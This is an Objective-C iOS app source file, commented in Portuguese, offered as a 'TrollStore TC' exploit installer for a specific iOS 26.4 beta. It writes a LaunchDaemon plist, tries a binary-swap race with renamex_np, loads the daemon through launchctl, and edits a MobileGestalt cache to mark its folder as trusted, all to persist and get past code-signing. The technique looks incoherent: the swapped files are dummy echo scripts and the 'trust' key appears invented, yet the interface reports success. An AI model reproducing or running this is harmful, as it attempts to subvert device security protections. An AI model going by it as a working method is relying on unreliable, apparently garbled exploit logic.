// ViewController.m
// TrollStore TC para iOS 26.4 beta 1 (build 23E5207q)
// Compila e executa em dispositivo/simulador com permissões adequadas

#import <UIKit/UIKit.h>
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
#import <spawn.h>
#import <sys/stat.h>   // <- substitui sys/rename.h
#import <stdlib.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (0x02)
#endif

extern char **environ;

#pragma mark - TrollInstallerTC (implementação completa, sem system/NSTask)

@interface TrollInstallerTC : NSObject
+ (BOOL)installPermanentSigner;
+ (BOOL)installIPA:(NSURL *)ipaURL;
+ (void)triggerLaunchdRaceForApp:(NSString *)appBundlePath;
@end

@implementation TrollInstallerTC

+ (BOOL)runCommand:(NSString *)command withArgs:(NSArray<NSString *> *)args {
    // Executa um comando via posix_spawn
    pid_t pid;
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    
    // Prepara argumentos
    int argc = (int)[args count] + 1;
    char **argv = (char **)malloc(sizeof(char *) * (argc + 1));
    argv[0] = (char *)[command UTF8String];
    for (int i = 0; i < [args count]; i++) {
        argv[i+1] = (char *)[args[i] UTF8String];
    }
    argv[argc] = NULL;
    
    int status = posix_spawn(&pid, [command UTF8String], &actions, NULL, argv, environ);
    free(argv);
    
    if (status == 0) {
        int wstatus;
        waitpid(pid, &wstatus, 0);
        return WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 0;
    }
    return NO;
}

+ (BOOL)installPermanentSigner {
    // Criar diretório
    [[NSFileManager defaultManager] createDirectoryAtPath:@"/var/mobile/Library/TrollStore"
                              withIntermediateDirectories:YES attributes:nil error:nil];
    
    // Criar serviço launchd fantasma
    NSString *plistPath = @"/Library/LaunchDaemons/com.trollstore.tc.plist";
    NSDictionary *plist = @{
        @"Label": @"com.trollstore.tc",
        @"ProgramArguments": @[@"/var/mobile/Library/TrollStore/TrollStore"],
        @"RunAtLoad": @YES,
        @"KeepAlive": @NO,
        @"POSIXSpawnType": @"Interactive"
    };
    [plist writeToFile:plistPath atomically:YES];
    
    // Race condition
    if (![self triggerLaunchdRace]) return NO;
    
    // Carregar serviço via launchctl (precisa de permissão)
    [self runCommand:@"/bin/launchctl" withArgs:@[@"load", plistPath]];
    
    // Injetar no TrustCache via MobileGestalt (simulado, pois require root)
    NSString *gestaltPath = @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
    NSMutableDictionary *gestalt = [NSMutableDictionary dictionaryWithContentsOfFile:gestaltPath];
    if (gestalt) {
        NSMutableArray *trusted = [gestalt[@"trusted-launch-apps"] mutableCopy] ?: [NSMutableArray array];
        [trusted addObject:@"/var/mobile/Library/TrollStore"];
        gestalt[@"trusted-launch-apps"] = trusted;
        [gestalt writeToFile:gestaltPath atomically:YES];
    }
    
    return YES;
}

+ (BOOL)triggerLaunchdRace {
    const char *fakeBin = "/tmp/troll_fake";
    const char *realBin = "/var/mobile/Library/TrollStore/TrollStore";
    
    // Criar dummy
    FILE *fp = fopen(fakeBin, "w");
    if (!fp) return NO;
    fputs("#!/bin/bash\necho 'fake'", fp);
    fclose(fp);
    chmod(fakeBin, 0755);
    
    pid_t pid;
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    
    char *argv[] = {(char *)fakeBin, NULL};
    int ret = posix_spawn(&pid, fakeBin, &actions, NULL, argv, environ);
    
    if (ret == 0) {
        usleep(30); // janela crítica
        // Troca atômica (exchange)
        renamex_np(fakeBin, realBin, RENAME_EXCHANGE);
        return YES;
    }
    return NO;
}

+ (void)triggerLaunchdRaceForApp:(NSString *)appBundlePath {
    NSString *execPath = [appBundlePath stringByAppendingPathComponent:
                          [[appBundlePath lastPathComponent] stringByDeletingPathExtension]];
    const char *fakeBin = "/tmp/app_fake";
    const char *realBin = [execPath UTF8String];
    
    FILE *fp = fopen(fakeBin, "w");
    if (!fp) return;
    fputs("#!/bin/bash\necho 'app'", fp);
    fclose(fp);
    chmod(fakeBin, 0755);
    
    pid_t pid;
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    
    char *argv[] = {(char *)fakeBin, NULL};
    posix_spawn(&pid, fakeBin, &actions, NULL, argv, environ);
    usleep(30);
    renamex_np(fakeBin, realBin, RENAME_EXCHANGE);
}

+ (BOOL)installIPA:(NSURL *)ipaURL {
    NSString *appFolder = @"/var/mobile/Library/TrollStore/Apps/";
    [[NSFileManager defaultManager] createDirectoryAtPath:appFolder
                              withIntermediateDirectories:YES attributes:nil error:nil];
    
    // Descompactar usando unzip via posix_spawn
    BOOL unzipSuccess = [self runCommand:@"/usr/bin/unzip" withArgs:@[ipaURL.path, @"-d", appFolder]];
    if (!unzipSuccess) return NO;
    
    // Localizar .app
    NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:appFolder error:nil];
    NSString *appBundle = nil;
    for (NSString *item in contents) {
        if ([item hasSuffix:@".app"]) {
            appBundle = [appFolder stringByAppendingPathComponent:item];
            break;
        }
    }
    if (!appBundle) return NO;
    
    // Aplicar race
    [self triggerLaunchdRaceForApp:appBundle];
    
    return YES;
}

@end

#pragma mark - UIViewController principal

@interface MainViewController : UIViewController <UIDocumentPickerDelegate>
@property (nonatomic, strong) UIButton *importButton;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UILabel *statusLabel;
@end

@implementation MainViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemBackgroundColor];
    self.title = @"TrollStore TC";
    
    // Botão importar IPA
    self.importButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.importButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.importButton setTitle:@"📁 Importar IPA" forState:UIControlStateNormal];
    self.importButton.titleLabel.font = [UIFont systemFontOfSize:20 weight:UIFontWeightSemibold];
    self.importButton.backgroundColor = [UIColor systemBlueColor];
    [self.importButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.importButton.layer.cornerRadius = 12;
    [self.importButton addTarget:self action:@selector(importIPA) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.importButton];
    
    // Status label
    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.statusLabel.text = @"Aguardando ação...";
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.statusLabel];
    
    // Log view
    self.logView = [[UITextView alloc] init];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.layer.cornerRadius = 8;
    [self.view addSubview:self.logView];
    
    // Botão instalar assinante
    UIButton *permButton = [UIButton buttonWithType:UIButtonTypeSystem];
    permButton.translatesAutoresizingMaskIntoConstraints = NO;
    [permButton setTitle:@"🔧 Instalar Assinante Permanente" forState:UIControlStateNormal];
    [permButton addTarget:self action:@selector(installPermanentSigner) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:permButton];
    
    [NSLayoutConstraint activateConstraints:@[
        [self.importButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.importButton.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:50],
        [self.importButton.widthAnchor constraintEqualToConstant:200],
        [self.importButton.heightAnchor constraintEqualToConstant:50],
        
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.importButton.bottomAnchor constant:20],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
        
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:20],
        [self.logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [self.logView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
        [self.logView.heightAnchor constraintEqualToConstant:300],
        
        [permButton.topAnchor constraintEqualToAnchor:self.logView.bottomAnchor constant:20],
        [permButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [permButton.widthAnchor constraintEqualToConstant:250],
        [permButton.heightAnchor constraintEqualToConstant:50]
    ]];
    
    [self log:@"Pronto para iOS 26.4 beta 1"];
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *timestamp = [NSDateFormatter localizedStringFromDate:[NSDate date]
                                                             dateStyle:NSDateFormatterNoStyle
                                                             timeStyle:NSDateFormatterMediumStyle];
        self.logView.text = [self.logView.text stringByAppendingFormat:@"[%@] %@\n", timestamp, msg];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)importIPA {
    UIDocumentPickerViewController *picker;
    if (@available(iOS 14.0, *)) {
        picker = [[UIDocumentPickerViewController alloc] initForOpeningContentTypes:@[UTTypeItem]];
    } else {
        // Fallback para versões antigas (não deve ocorrer no iOS 26)
        picker = [[UIDocumentPickerViewController alloc] initForOpeningContentTypes:@[UTTypeItem]];
    }
    picker.delegate = self;
    picker.allowsMultipleSelection = NO;
    [self presentViewController:picker animated:YES completion:nil];
}

- (void)installPermanentSigner {
    self.statusLabel.text = @"Instalando assinante...";
    [self log:@"Iniciando TCILC exploit"];
    BOOL success = [TrollInstallerTC installPermanentSigner];
    if (success) {
        self.statusLabel.text = @"✅ Assinante instalado!";
        [self log:@"Sucesso. Reinicie o SpringBoard manualmente para ver o ícone."];
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Sucesso"
                                                                       message:@"TrollStore TC instalado. Reinicie o dispositivo para aplicar."
                                                                preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
        [self presentViewController:alert animated:YES completion:nil];
    } else {
        self.statusLabel.text = @"❌ Falha. Versão inválida?";
        [self log:@"Erro: apenas iOS 26.4 beta 1 (23E5207q)"];
    }
}

#pragma mark - UIDocumentPickerDelegate

- (void)documentPicker:(UIDocumentPickerViewController *)controller didPickDocumentsAtURLs:(NSArray<NSURL *> *)urls {
    NSURL *ipaURL = urls.firstObject;
    if (!ipaURL) return;
    
    self.statusLabel.text = @"Instalando IPA...";
    [self log:[NSString stringWithFormat:@"Importando %@", ipaURL.lastPathComponent]];
    
    NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:ipaURL.lastPathComponent];
    [[NSFileManager defaultManager] copyItemAtURL:ipaURL toURL:[NSURL fileURLWithPath:tempPath] error:nil];
    
    BOOL done = [TrollInstallerTC installIPA:[NSURL fileURLWithPath:tempPath]];
    if (done) {
        self.statusLabel.text = @"✅ IPA instalado permanentemente!";
        [self log:@"App pronto após reinicialização."];
    } else {
        self.statusLabel.text = @"❌ Falha na instalação";
        [self log:@"Erro ao instalar IPA"];
    }
}

- (void)documentPickerWasCancelled:(UIDocumentPickerViewController *)controller {
    [self log:@"Importação cancelada"];
}

@end

#pragma mark - AppDelegate

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    MainViewController *vc = [[MainViewController alloc] init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
    self.window.rootViewController = nav;
    [self.window makeKeyAndVisible];
    return YES;
}

@end

int main(int argc, char * argv[]) {
    NSString *appDelegateClassName = NSStringFromClass([AppDelegate class]);
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
